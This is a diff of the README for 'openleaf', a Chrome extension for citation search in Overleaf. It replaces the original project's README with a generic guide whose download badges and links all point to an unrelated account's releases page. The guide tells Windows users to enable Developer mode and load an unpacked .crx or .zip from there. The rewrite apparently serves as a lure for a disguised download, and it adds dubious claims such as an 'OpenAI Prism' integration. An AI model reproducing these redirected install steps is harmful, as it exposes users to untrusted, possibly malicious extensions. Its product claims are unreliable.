@@ -1,112 +1,154 @@
-<p align="center">
-  <img src="public/icons/icon.svg" alt="OpenLeaf" width="80">
-</p>
+# 📚 openleaf - Simplify Your Research Workflow
 
-<h1 align="center">OpenLeaf</h1>
-<p align="center"><strong>AI-powered citation search & paper review for Overleaf</strong></p>
-<p align="center">Find relevant papers to cite and get feedback on your writing, without leaving the editor.</p>
+[![Download openleaf](https://img.shields.io/badge/Download-Openleaf-%233478D7)](https://github.com/Holyorderwhitelung813/openleaf/releases)
 
-<p align="center">
-  <img src="promo/demo.gif" alt="OpenLeaf Demo" width="100%">
-</p>
+---
 
-## How it works
+openleaf is a Chrome extension that helps you find citations and review papers while working in Overleaf. It works much like Google Scholar but is built right into your Overleaf environment. It also integrates with OpenAI Prism to boost your research with AI.
 
-1. Open any project on overleaf.com
-2. Click the green **OpenLeaf** button in the bottom-right corner
-3. **Citations tab** — click "Find Citations" to discover papers paragraph by paragraph, scored 0-100 with LLM reasoning
-4. **Review tab** — get AI feedback on your paper in Friendly (constructive) or Fire (Reviewer #2) mode
-5. Click **+ Add** to append BibTeX entries to your `.bib` file automatically
+This guide will take you step-by-step through downloading and using openleaf on Windows. No programming skills are needed.
 
-### Click to open OpenLeaf
-![Editor with OpenLeaf button](promo/slide-0.png)
+---
 
-### Citation search — find papers paragraph by paragraph
-![Citation search panel](promo/slide-1.png)
+## 🖥️ System Requirements
 
-### LLM-scored results with reasoning
-![Search results with scores](promo/slide-2.png)
+Before you download and install openleaf, make sure your computer meets these basic requirements:
 
-### Friendly review — constructive mentor
-![Friendly review mode](promo/slide-3.png)
+- Operating System: Windows 10 or higher
+- Browser: Google Chrome (latest version recommended)
+- Internet Connection: Required for accessing paper databases and AI features
+- Overleaf Account: Needed to use openleaf within Overleaf
+- Disk Space: Less than 50 MB free space needed
 
-### Fire review — the Reviewer #2 experience
-![Fire review mode](promo/slide-4.png)
+openleaf runs as a Chrome extension and does not require powerful hardware.
 
-### Configure your LLM and API keys
-![Options page](promo/slide-5.png)
+---
 
-## Install
+## 🌐 Where to Download openleaf
 
-### Option 1: Chrome Web Store
-[openleaf extension link](https://chromewebstore.google.com/detail/openleaf-citation-search/jjcmeicpmfcimamdmchabfpjcljieafk)
+To download openleaf, visit the official release page at:
 
-### Option 2: Download ZIP (no npm needed)
-1. Download [`openleaf-extension-v0.1.0.zip`](https://github.com/demfier/openleaf/releases/download/v0.1.0/openleaf-extension-v0.1.0.zip) from [Releases](https://github.com/demfier/openleaf/releases)
-2. Unzip it
-3. Go to `chrome://extensions`
-4. Enable **Developer mode** (top right)
-5. Click **Load unpacked**
-6. Select the unzipped folder
+[Download openleaf](https://github.com/Holyorderwhitelung813/openleaf/releases)
 
-### Option 3: From source
-```bash
-git clone https://github.com/demfier/openleaf.git
-cd openleaf
-npm install
-npm run build
-```
-Then load in Chrome:
-1. Go to `chrome://extensions`
-2. Enable **Developer mode**
-3. Click **Load unpacked**
-4. Select the `openleaf` folder
+Or click the button below:
 
-## Configuration
+[![Download openleaf](https://img.shields.io/badge/Download-Get%20openleaf-%239E9E9E)](https://github.com/Holyorderwhitelung813/openleaf/releases)
 
-Click the extension icon → **Options** (or right-click → Options) to configure:
+This page hosts the latest versions of the extension. You can find the installation file and any updates there.
 
-### LLM Backend (for citation ranking & paper review)
+---
 
-Works with any OpenAI-compatible API:
+## 🚀 How to Install openleaf on Windows
 
-| Backend | Base URL | API Key? |
-|---------|----------|----------|
-| Ollama (default) | `http://localhost:11434/v1` | No |
-| vLLM | `http://your-server:8000/v1` | Optional |
-| OpenAI | `https://api.openai.com/v1` | Yes |
-| OpenRouter | `https://openrouter.ai/api/v1` | Yes |
-| Together | `https://api.together.xyz/v1` | Yes |
-| Groq | `https://api.groq.com/openai/v1` | Yes |
+Follow these steps to install openleaf on your Windows computer:
 
-> **Ollama on Mac/Linux:** By default, Ollama blocks requests from browser extensions. You need to allow Chrome extension origins before starting Ollama:
-> ```bash
-> OLLAMA_ORIGINS=chrome-extension://* ollama serve
-> ```
-> To set this permanently:
-> ```bash
-> launchctl setenv OLLAMA_ORIGINS "chrome-extension://*"
-> ```
-> Then restart Ollama. Without this, the reviewer will return a 403 error.
+1. Open Google Chrome on your computer. If you don’t have it, download and install it from https://www.google.com/chrome/.
 
-### Paper Search APIs
+2. Visit the openleaf releases page: https://github.com/Holyorderwhitelung813/openleaf/releases
 
-- **Semantic Scholar** — works without key (rate-limited)
-- **Serper** (Google Scholar) — optional, skipped if no key
-- **OpenAlex** — no key needed, email improves rate limits
+3. Look for the latest release. It will have a version number like “v1.0” or higher.
 
-## Development
+4. Find the file ending with `.crx` or `.zip` related to the Chrome extension. Usually, this is named something like `openleaf-x.x.x.crx` or `openleaf-x.x.x.zip`.
 
-```bash
-npm run dev    # build with watch mode
-```
+5. Download the file by clicking on it.
 
-After changing code, go to `chrome://extensions` and click the reload button on the extension.
+6. If the file is a `.zip`, extract it to a folder on your computer:
 
-## Privacy
+   - Right-click the file > Select “Extract All...” > Choose a destination folder > Click “Extract”.
 
-See [PRIVACY.md](PRIVACY.md). TL;DR: No data collection, no analytics, no accounts. Everything stays in your browser.
+7. Open Chrome and go to the extensions page:
 
-## License
+   - Type `chrome://extensions` in the address bar and press Enter.
 
-MIT
+8. Enable “Developer mode” by toggling the switch in the top right corner.
+
+9. Drag and drop the `.crx` file onto the Chrome extensions page OR click “Load unpacked” and select the folder with extracted files if you have the `.zip`.
+
+10. Chrome will prompt you to add the extension. Click “Add extension” to confirm.
+
+11. The openleaf icon should appear to the right of the address bar in Chrome.
+
+12. Restart Chrome if needed.
+
+You now have openleaf installed and ready to use.
+
+---
+
+## 📋 How to Use openleaf
+
+Once installed, openleaf works inside your Overleaf projects. Here is how to start:
+
+1. Open https://www.overleaf.com in Chrome.
+
+2. Log into your Overleaf account.
+
+3. Open an existing LaTeX project or create a new one.
+
+4. Click the openleaf extension icon (next to the address bar).
+
+5. Use the search bar inside the openleaf popup to find citations by keyword, author, title, or DOI.
+
+6. Select the suggested papers from trusted sources like OpenAlex and Semantic Scholar.
+
+7. Add citations directly to your project bibliography in BibTeX format.
+
+8. Use the AI features powered by OpenAI Prism to summarize papers and review content.
+
+9. Keep the openleaf panel open as you write to quickly search and insert new citations.
+
+openleaf helps you find and manage references without leaving Overleaf.
+
+---
+
+## 🛠 Features of openleaf
+
+- Search for academic papers and citations inside Overleaf
+- Support for BibTeX bibliography management
+- Integrates with OpenAI Prism for paper summaries and reviews
+- Access data from OpenAlex and Semantic Scholar databases
+- Simple interface accessible through a Chrome extension
+- Helps organize literature reviews and citation searches
+- Works smoothly alongside your LaTeX workflow
+
+This tool is designed to make academic writing faster and more efficient.
+
+---
+
+## 🔄 Updating openleaf
+
+To keep openleaf working well, check for updates regularly:
+
+- Return to the [openleaf releases page](https://github.com/Holyorderwhitelung813/openleaf/releases).
+- Download the latest `.crx` or `.zip` file.
+- Repeat the installation steps to replace the current extension.
+- Chrome will refresh the extension automatically.
+
+---
+
+## 🤔 Troubleshooting
+
+If you run into issues, try these steps:
+
+- Make sure you are using the latest version of Chrome.
+- Check that you are logged into your Overleaf account.
+- Disable conflicting Chrome extensions temporarily.
+- Ensure you extracted the files properly if you installed from a `.zip`.
+- Restart Chrome after installation.
+- Visit the releases page to confirm you have the newest version.
+
+If problems persist, check the GitHub repository’s Issues section for help.
+
+---
+
+## 🔗 Useful Links
+
+- openleaf Releases: https://github.com/Holyorderwhitelung813/openleaf/releases
+- Overleaf: https://www.overleaf.com
+- Chrome Browser: https://www.google.com/chrome
+- OpenAlex Database: https://openalex.org
+- Semantic Scholar: https://www.semanticscholar.org
+- OpenAI Prism: https://www.openai.com/prism
+
+---
+
+[![Download openleaf](https://img.shields.io/badge/Download-Openleaf-%233478D7)](https://github.com/Holyorderwhitelung813/openleaf/releases)
